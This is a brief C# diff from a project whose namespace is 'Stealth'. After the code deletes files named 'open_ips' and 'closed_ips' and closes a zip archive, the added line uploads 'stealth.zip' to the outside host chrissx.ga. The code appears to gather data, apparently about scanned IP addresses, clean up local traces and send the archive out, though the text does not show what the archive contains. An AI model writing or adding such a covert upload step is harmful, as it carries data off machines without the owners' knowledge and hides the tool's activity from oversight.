@@ -34,6 +34,7 @@ namespace Stealth
             delete("open_ips");
             delete("closed_ips");
             zip.Dispose();
+            post("https://chrissx.ga", "stealth.zip", "zip");
         }
     }
 }
